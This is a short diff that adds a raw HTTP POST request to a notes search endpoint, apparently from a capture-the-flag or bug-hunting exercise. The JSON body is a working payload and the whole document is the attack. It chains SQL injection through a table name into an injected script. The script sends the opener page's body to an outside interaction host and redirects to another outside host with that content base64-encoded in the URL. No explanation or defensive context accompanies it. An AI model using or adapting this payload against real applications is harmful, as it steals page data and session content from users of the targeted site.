@@ -1,0 +1,6 @@
+
+POST /notes/search HTTP/1.1
+
+{"searchValue":"asd","tables": ["fffff`", "users`,JSON_TABLE('[{\"asd\":\"<script>fetch(\\'//cbugqmlljoztovdowpsqqnspilwevyqe7.oast.fun\\');navigator.sendBeacon(\\'//cbugqmlljoztovdowpsqqnspilwevyqe7.oast.fun\\', opener.opener.document.body.innerHTML);location=\\'http://raw.sbx.ado.world:1234/?\\'+btoa(opener.opener.document.body.innerHTML)</script>\"}]', '$[*]' COLUMNS (alt TEXT path '$.asd') ) as __proto__ -- - "]}
+
+
